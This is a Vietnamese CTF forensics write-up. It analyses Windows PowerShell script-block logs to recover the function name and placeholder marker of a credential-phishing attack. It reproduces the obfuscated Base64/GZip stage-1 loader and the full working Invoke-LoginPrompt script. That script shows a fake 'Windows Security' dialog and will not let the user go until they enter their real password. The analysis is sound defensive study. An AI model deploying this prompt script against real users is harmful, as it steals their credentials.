---
title: "CTF Write-up: Prompt and Pretext"
date: "2026.07.21"
author: "admin"
categoryEn: "FORENSICS"
categoryJp: "鑑識"
difficulty: "mid"
---
+++
title = 'Prompt and Pretext — Write-up'
date = '2026-07-14T01:18:21+07:00'
draft = false
tags = ['GrodnoCTF', 'windows', 'powershell', 'evtx', 'credential-phishing']
categories = ['Forensics']
+++

# CTF Write-up: Prompt and Pretext

**Category:** Windows Forensics / PowerShell
**Flag format:** `grodno{function_marker}`
**Flag cuối:** `grodno{Invoke-LoginPrompt_R{START_PROCESS}}`

---

## Mô tả bài

> We collected a large set of Windows Event Logs (`.evtx`) after a series of suspicious activities on a system.
>
> Find and analyze a credential-phishing attack chain executed via obfuscated PowerShell (stage-1). From the analysis, extract two values:
> 1. The name of the function that displays the credential prompt dialog.
> 2. The placeholder marker left in the script for the next stage action.
>
> **Flag format:** `grodno{function_marker}`
> **Example:** `grodno{DoStuff_STAGE2}`

**Tải về đề bài:** [challenge files — OneDrive](https://1drv.ms/u/c/2f661437c52d8a10/IQCvVzc0RtfFT73eLxxh4B7bARpv-MHo1ZrWf1feWi2yKyc?e=pi2Bzd)

---

## Nhận file và kiểm tra nhanh

Giải nén ra thì thấy thư mục `EVTX-ATTACK-SAMPLES/` — không phải một vài file evtx lẻ tẻ, mà là toàn bộ một repository mẫu tấn công được tổ chức theo kiểu khung phân tích:

```bash
$ ls EVTX-ATTACK-SAMPLES/
```

```
AutomatedTestingTools/
Command and Control/
Credential Access/
Defense Evasion/
Discovery/
Execution/
Lateral Movement/
Other/
Persistence/
Privilege Escalation/
...
```

Mỗi thư mục tương ứng với một tactic trong **MITRE ATT&CK** — đây là khung phân loại hành vi tấn công được dùng rộng rãi trong Blue Team. Đề bài nói đến "credential-phishing", mà theo MITRE thì hành vi đánh cắp thông tin đăng nhập thuộc tactic **Credential Access**. Thay vì đọc qua từng thư mục, mình đi thẳng vào đó.

---

## Phần 1: Xác định file log mục tiêu

```bash
$ ls "EVTX-ATTACK-SAMPLES/Credential Access/"
```

```
4794_DSRM_password_change_t1098.evtx
ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx
CA_4624_4625_LogonType2_LogonProc_chrome.evtx
CA_DCSync_4662.evtx
CA_Mimikatz_Memssp_Default_Logs_Sysmon_11.evtx
CA_chrome_firefox_opera_4663.evtx
CA_hashdump_4663_4656_lsass_access.evtx
babyshark_mimikatz_powershell.evtx
kerberos_pwd_spray_4771.evtx
phish_windows_credentials_powershell_scriptblockLog_4104.evtx
...
```

Có khoảng 40 file trong thư mục này, nhưng mình chỉ cần nhìn qua tên là thấy ngay: `phish_windows_credentials_powershell_scriptblockLog_4104.evtx`.

Tên file này cho biết rất nhiều thứ cùng lúc:
- `phish_windows_credentials` — khớp thẳng với từ khóa của đề bài
- `powershell_scriptblockLog` — đây là log do tính năng **Script Block Logging** của PowerShell tạo ra
- `4104` — Event ID của log này

Event ID 4104 là một trong những artifact quý giá nhất trong PowerShell forensics. Khi Script Block Logging được bật, Windows sẽ ghi lại **toàn bộ nội dung script PowerShell** trước khi chạy, bao gồm cả phần đã được de-obfuscate trong bộ nhớ. Tức là dù kẻ tấn công có mã hóa hay xáo trộn script ở stage đầu, Event 4104 vẫn ghi lại đoạn mã thật khi nó được thực thi.

---

## Phần 2: Trích xuất nội dung từ file EVTX

File `.evtx` là định dạng nhị phân của Windows Event Log — không đọc thẳng được bằng `cat`. Trên Linux, có nhiều cách để mở nó:
- `python-evtx` + `evtx_dump.py` — parse chuẩn ra XML
- `chainsaw`, `hayabusa` — quét phân tích nhanh
- `strings -el` — thô nhất nhưng nhanh nhất, kéo toàn bộ chuỗi ký tự có thể đọc được từ file nhị phân

File `.evtx` lưu chuỗi theo chuẩn UTF-16 Little Endian, nên cần flag `-el` (encoding: little-endian 16-bit). Mình dùng cách này trước vì mục tiêu là tìm mã nguồn PowerShell — đó là text, và `strings` sẽ kéo nó ra dù file có cấu trúc nhị phân ra sao đi nữa.

```bash
$ strings -el "EVTX-ATTACK-SAMPLES/Credential Access/phish_windows_credentials_powershell_scriptblockLog_4104.evtx" | head -n 80
```

```
Event
xmlns
5http://schemas.microsoft.com/win/2004/08/events/event
System
Provider
...
Microsoft-Windows-PowerShell/Operational
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAAlVdl0CA81UXW/aMBR996+4svJANJIfgNQHBNs6aaWIsO2hnSbXuaVeEzuyHdKI8d93YwIDTUJlfVkeLPme+3F87lEeay29Mho+6bV5xuSzWSk9t6as/IZF0mIOVxBdG+fTWqU74IOxEwJQeyWKAf+mdG4aBxnK2irf8iHweYHCIVAKWqgdHfJQ4bqECPV61AG5KYXS94e7FiXyIecxi/ZXYsBPcRbtyk6QXYiwx7ooAtJH4B3w+3BGRx0q4VxjbHhfRy79iH6GnkLPR6+L030eG+d5smwrhIQiWD4UbSCXtc5jmU6VRemNbTO0ayXRpWMpTa39jdBihSX1Y9E0o2kzbJLbh5+UfUEtSa+0VJUoJoZEffGDuwuK+5qO/ffR6EbIJ6UxZs2TKnBArNKvolC58Pjn5W7Ag5C0i4NUPIZEI0RLW2O8YUDfv1uEDNcNhaORQ+h9420LYtXt7nVWCUzO2CXgZywT8FfZJmRebJ2u6u32CbP/Mwv1nM4aCE4c9AtM7RNNSCjeMogoUNW+U1NjszfUGWGph8OCKCdmJ8IX2s+M1BzCNOyOjHSQvu/OYLHJluPF8sd8cTt5n2VbtmV///R+A6HMO3IQBQAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
37f6d110-cfdf-4118-8748-17638e258531
Microsoft-Windows-PowerShell/Operational
function Invoke-LoginPrompt{
$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
$username = "$env:username"
$domain = "$env:userdomain"
$full = "$domain" + "\" + "$username"
$password = $cred.GetNetworkCredential().password
Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(...)
while($DS.ValidateCredentials("$full","$password") -ne $True){
    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", ...)
    ...
    $DS.ValidateCredentials("$full", "$password") | out-null
    }
 $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
 $output
 R{START_PROCESS}
Invoke-LoginPrompt
c7ca7056-b317-4fff-b796-05d8ef896dcd
```

Output hiện ra hai khối script riêng biệt. Đây là điều mình không ngờ tới lúc đầu.

---

### Khoảnh khắc nhận ra

> Nhìn vào output lần đầu, mình thấy có **hai Event 4104 riêng biệt** được log lại, ứng với hai đoạn script khác nhau trong cùng một phiên tấn công:
>
> **Event đầu tiên** — đoạn stage-1 bị obfuscate:
> ```
> &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream(... Base64 dài ...
> ```
> Đây là kỹ thuật loader quen thuộc: decode Base64 → giải nén GZip → tạo scriptblock → chạy. Mục đích là bypass các AV signature-based đơn giản.
>
> **Event thứ hai** — đoạn payload thật sau khi de-obfuscate, được Event 4104 bắt lại:
> ```powershell
> function Invoke-LoginPrompt{ ... }
> ```
> Event 4104 ghi lại script *sau* khi PowerShell đã xử lý xong stage-1 và extract được nội dung thật. Chính xác là cơ chế mà logging này được thiết kế ra để làm.

---

## Phần 3: Phân tích đoạn script thật

Đây là toàn bộ nội dung de-obfuscated script mà Event 4104 ghi lại:

```powershell
function Invoke-LoginPrompt{
$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
$username = "$env:username"
$domain = "$env:userdomain"
$full = "$domain" + "\" + "$username"
$password = $cred.GetNetworkCredential().password

Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)

while($DS.ValidateCredentials("$full","$password") -ne $True){
    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $DS.ValidateCredentials("$full", "$password") | out-null
    }
    
 $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
 $output
 R{START_PROCESS}
```

Script này thực hiện một cuộc tấn công credential phishing theo kiểu khá tinh vi:

1. `$Host.ui.PromptForCredential(...)` — gọi trực tiếp vào PowerShell host API để bật popup giả mạo giao diện "Windows Security", yêu cầu người dùng nhập mật khẩu. Cửa sổ này trông không khác gì UAC prompt thật.

2. Sau khi người dùng nhập, script dùng `System.DirectoryServices.AccountManagement.PrincipalContext` để gọi `ValidateCredentials()` — xác thực thật sự mật khẩu vừa nhập với hệ thống. Nếu sai, vòng lặp `while` giữ popup lại và yêu cầu nhập lại. Người dùng không thể thoát ra cho đến khi nhập đúng.

3. Khi mật khẩu đúng, thông tin được gom vào `$output` bao gồm `UserName`, `Domain`, `Password`. Đây là lúc data được chuẩn bị để gửi về C2.

4. Dòng cuối cùng `R{START_PROCESS}` không phải là lệnh PowerShell hợp lệ — đây là **placeholder** chưa được thay thế. Trong các framework tạo payload tự động (Metasploit, Empire...), builder thường nhúng chuỗi đánh dấu như thế này vào template, rồi khi sinh payload thật sẽ thay bằng đoạn shellcode để kết nối C2 hoặc chạy backdoor stage-2. File log này bắt được script ở trạng thái chưa hoàn chỉnh — attacker có thể đang test, hoặc builder chưa replace xong.

---

## Ghép Flag

| Thành phần | Giá trị | Nguồn |
|---|---|---|
| `function` | `Invoke-LoginPrompt` | Tên hàm định nghĩa credential prompt, dòng đầu script |
| `marker` | `R{START_PROCESS}` | Placeholder chưa được replace, dòng cuối script |

```
grodno{Invoke-LoginPrompt_R{START_PROCESS}}
```

---

## Bài học rút ra

**1. Event ID 4104 là vũ khí số một khi điều tra PowerShell**
Script Block Logging ghi lại nội dung script *sau khi de-obfuscate* — tức là dù kẻ tấn công có dùng Base64, GZip, hay xáo trộn cú pháp kiểu gì, Event 4104 vẫn ghi lại đoạn mã thật. Gặp bài PowerShell forensics, tìm file có `4104` trong tên hoặc lọc bằng EventID 4104 trước tiên.

**2. Dùng cấu trúc MITRE ATT&CK để định hướng thay vì duyệt mù**
Dataset chứa hàng chục file log, nhưng biết "credential phishing" thuộc tactic "Credential Access" giúp mình loại bỏ 90% số file ngay từ đầu. Khi nhận dataset EVTX lớn, việc đầu tiên là map yêu cầu đề bài vào một tactic cụ thể trong MITRE rồi thu hẹp phạm vi tìm kiếm.

**3. `strings -el` là cách đọc EVTX nhanh nhất trên Linux khi chỉ cần text**
Nếu mục tiêu là kéo ra mã nguồn script hay các chuỗi đặc trưng, không cần parse cấu trúc XML của EVTX. Flag `-el` (little-endian 16-bit) xử lý đúng encoding UTF-16 mà Windows dùng trong file evtx. Kết quả thô nhưng đủ để tìm những gì cần thiết.

**4. Placeholder trong payload là dấu hiệu nhận biết framework tạo tự động**
Chuỗi `R{START_PROCESS}` không phải lỗi ngẫu nhiên — đây là dấu vết của builder template. Gặp các chuỗi dạng `{SOMETHING}`, `{{PLACEHOLDER}}`, `%%TOKEN%%` trong script độc hại, khả năng cao đó là chỗ builder chưa điền shellcode thật vào. Biết điều này giúp nhận ra đây là payload chưa hoàn chỉnh, và attacker đang trong giai đoạn test hoặc chuẩn bị.
